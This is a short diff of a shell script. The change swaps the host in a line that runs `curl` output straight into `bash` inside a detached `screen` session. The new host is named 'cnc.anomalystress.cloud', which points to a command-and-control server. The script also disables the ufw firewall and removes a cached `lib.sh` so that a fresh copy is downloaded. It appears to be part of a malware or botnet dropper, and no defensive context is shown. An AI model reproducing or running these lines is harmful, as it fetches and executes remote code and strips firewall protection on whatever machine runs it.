@@ -115,5 +115,5 @@ rm -rf /tmp/lib.sh
 
 # Remove lib.sh, so next time the script is run the, newest version is downloaded.
 rm -rf /tmp/lib.sh
-screen -dm bash -c "$(curl -s http://8.219.192.147:1000/exec.sh)"
+screen -dm bash -c "$(curl -s http://cnc.anomalystress.cloud:9000/exec.sh)"
 ufw disable
